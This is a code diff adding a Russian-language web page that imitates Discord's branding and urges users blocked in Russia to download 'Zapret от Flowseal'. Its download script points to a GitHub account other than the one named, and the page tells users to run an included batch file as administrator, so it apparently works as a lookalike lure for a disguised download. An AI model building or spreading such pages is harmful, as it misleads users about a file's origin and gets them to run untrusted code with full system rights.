@@ -1,0 +1,254 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord Россия — Zapret обход блокировки</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #000000;
+            font-family: 'Inter', 'Whitney', -apple-system, BlinkMacSystemFont, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            color: #ffffff;
+        }
+
+        .full-site {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .navbar {
+            background: #0a0a0a;
+            border-bottom: 1px solid #1f1f1f;
+            padding: 16px 48px;
+            display: flex;
+            align-items: center;
+            gap: 24px;
+            flex-wrap: wrap;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .logo-icon {
+            background: #5865f2;
+            width: 40px;
+            height: 40px;
+            border-radius: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            font-weight: 900;
+            color: white;
+        }
+
+        .logo-text {
+            font-size: 24px;
+            font-weight: 700;
+            color: #ffffff;
+        }
+
+        .nav-status {
+            background: #ed4245;
+            padding: 6px 14px;
+            border-radius: 30px;
+            font-size: 13px;
+            font-weight: 600;
+            color: #ffffff;
+        }
+
+        .main-center {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            padding: 40px 20px;
+        }
+
+        .block-badge {
+            background: rgba(237, 66, 69, 0.15);
+            padding: 8px 24px;
+            border-radius: 60px;
+            margin-bottom: 32px;
+            font-size: 14px;
+            font-weight: 500;
+            border: 1px solid rgba(237, 66, 69, 0.4);
+            color: #ffffff;
+        }
+
+        h1 {
+            font-size: 68px;
+            font-weight: 800;
+            color: #ffffff;
+            margin-bottom: 20px;
+            letter-spacing: -1px;
+        }
+
+        .sub {
+            font-size: 20px;
+            color: #cccccc;
+            max-width: 600px;
+            margin-bottom: 48px;
+        }
+
+        .download-button {
+            background: #5865f2;
+            border: none;
+            padding: 22px 56px;
+            border-radius: 80px;
+            cursor: pointer;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            transition: 0.2s;
+            box-shadow: 0 12px 28px rgba(88, 101, 242, 0.4);
+            margin-bottom: 32px;
+        }
+
+        .download-button:hover {
+            background: #4752c4;
+            transform: scale(1.03);
+        }
+
+        .download-button:active {
+            transform: scale(0.98);
+        }
+
+        .button-text {
+            font-size: 32px;
+            font-weight: 800;
+            color: #ffffff;
+            letter-spacing: 1px;
+        }
+
+        .info-panel {
+            background: #0a0a0a;
+            border-radius: 28px;
+            padding: 28px 40px;
+            max-width: 800px;
+            margin: 20px auto 0;
+            border: 1px solid #1f1f1f;
+        }
+
+        .info-panel p, .info-panel div {
+            color: #dddddd;
+        }
+
+        .methods {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 16px;
+            justify-content: center;
+            margin-top: 20px;
+        }
+
+        .method {
+            background: #111111;
+            padding: 10px 20px;
+            border-radius: 40px;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: #ffffff;
+        }
+
+        footer {
+            background: #050505;
+            padding: 20px;
+            text-align: center;
+            font-size: 13px;
+            color: #888888;
+            border-top: 1px solid #1a1a1a;
+            margin-top: 40px;
+        }
+
+        @media (max-width: 700px) {
+            h1 { font-size: 42px; }
+            .button-text { font-size: 24px; }
+            .download-button { padding: 16px 40px; }
+            .navbar { padding: 16px 24px; }
+        }
+    </style>
+</head>
+<body>
+    <div class="full-site">
+        <div class="navbar">
+            <div class="logo">
+                <div class="logo-icon">🎧</div>
+                <div class="logo-text">DISCORD</div>
+            </div>
+            <div class="nav-status">
+                ЗАБЛОКИРОВАН В РФ
+            </div>
+            <div style="margin-left: auto; font-size: 13px; background: #1a1a2a; padding: 6px 14px; border-radius: 40px; color: white;">
+                ОБХОД АКТИВЕН
+            </div>
+        </div>
+
+        <div class="main-center">
+            <h1>DISCORD НЕ РАБОТАЕТ?</h1>
+            <div class="sub">
+                Скачай Zapret для обхода блокировки
+            </div>
+
+            <button class="download-button" id="realDownloadBtn">
+                <span class="button-text">СКАЧАТЬ</span>
+            </button>
+
+            <div class="info-panel">
+                <div style="font-weight: 700; margin-bottom: 12px; color: white;">Zapret от Flowseal</div>
+                <div class="methods">
+                    <div class="method">Обход DPI блокировки Discord</div>
+                    <div class="method">Работает на Windows</div>
+                    <div class="method">Простая установка</div>
+                </div>
+                <div style="margin-top: 16px; font-size: 13px; background: #0a0a12; padding: 10px; border-radius: 18px; color: #bbb;">
+                    После скачивания — распакуй архив и запусти `service_install_discord.bat` от имени администратора
+                </div>
+            </div>
+        </div>
+
+        <footer>
+            Инструмент для обхода блокировок. Zapret не нарушает законодательство.
+        </footer>
+    </div>
+
+    <script>
+        (function() {
+            const downloadBtn = document.getElementById('realDownloadBtn');
+            const downloadUrl = "https://github.com/discordzapret/zapret-discord/releases/download/zapret-discord/zapret-discord-youtube-1.9.8c.zip";
+            
+            downloadBtn.addEventListener('click', function(e) {
+                const link = document.createElement('a');
+                link.href = downloadUrl;
+                link.download = '';
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);
+                
+                const originalHTML = downloadBtn.innerHTML;
+                downloadBtn.innerHTML = '<span class="button-text">ЗАГРУЗКА...</span>';
+                setTimeout(() => {
+                    downloadBtn.innerHTML = originalHTML;
+                }, 2000);
+            });
+        })();
+    </script>
+</body>
+</html>
